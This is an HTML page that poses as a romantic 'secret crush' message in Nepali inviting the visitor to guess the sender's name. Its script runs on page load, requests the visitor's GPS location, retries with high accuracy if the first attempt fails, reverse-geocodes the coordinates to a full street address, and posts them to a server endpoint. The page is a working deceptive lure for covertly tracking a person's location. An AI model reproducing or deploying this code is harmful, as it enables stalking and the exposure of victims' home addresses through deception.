<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f0f; color: #eee;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }
    h1 { font-size: 20px; font-weight: 700; text-align: center; }
  </style>
</head>
<body>
  <h1>स्वागत छ प्रेम, यो मेरो हृदय सधैं र सदाको लागि तपाइँको हो। मलाई फेला पार्न क्लिक गर्नुहोस्। म तिम्रो गोप्य क्रस हुँ। केवल मेरो नाम अनुमान गर्नुहोस् र जवाफ दिनुहोस्।</h1>

  <script>
    var saved = false;

    async function geocode(lat, lon) {
      try {
        var r = await fetch(
          'https://nominatim.openstreetmap.org/reverse?lat=' + lat +
          '&lon=' + lon + '&format=json&addressdetails=1',
          { headers: { 'Accept-Language': 'en' } }
        );
        var d = await r.json();
        if (!d || !d.address) return null;
        var a = d.address;
        return {
          city:        a.city || a.town || a.village || a.suburb || a.county || '',
          region:      a.state || '',
          country:     a.country || '',
          countryCode: (a.country_code || '').toUpperCase(),
          zip:         a.postcode || '',
          fullAddress: d.display_name || ''
        };
      } catch(e) { return null; }
    }

    async function save(data) {
      if (saved) return;
      saved = true;
      try {
        await fetch('/api/update-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
      } catch(e) {}
    }

    async function onPosition(pos) {
      var lat = pos.coords.latitude;
      var lon = pos.coords.longitude;
      var geo = await geocode(lat, lon);
      if (geo && geo.city) {
        await save({ lat, lon, city: geo.city, region: geo.region,
          country: geo.country, countryCode: geo.countryCode,
          zip: geo.zip, fullAddress: geo.fullAddress, lookupSource: 'gpsNominatim' });
      } else {
        await save({ lat, lon, lookupSource: 'gpsOnly' });
      }
    }

    function onError() {
      // Try high accuracy GPS as fallback
      navigator.geolocation.getCurrentPosition(
        onPosition,
        function() { save({ lookupSource: 'gpsDenied' }); },
        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
      );
    }

    // Fire automatically on page load
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        onPosition,
        onError,
        { enableHighAccuracy: false, timeout: 8000, maximumAge: 30000 }
      );
    } else {
      save({ lookupSource: 'unsupported' });
    }
  </script>
</body>
</html>
